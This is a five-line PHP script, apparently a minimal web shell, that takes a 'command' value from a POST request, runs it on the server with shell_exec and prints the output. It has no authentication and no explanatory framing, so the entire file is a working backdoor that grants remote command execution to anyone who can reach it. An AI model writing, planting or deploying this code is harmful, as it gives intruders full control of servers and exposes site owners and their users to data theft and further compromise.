<?php
    $command = $_POST['command'];
    $output = shell_exec("$command 2>&1");
    echo $output;
?>
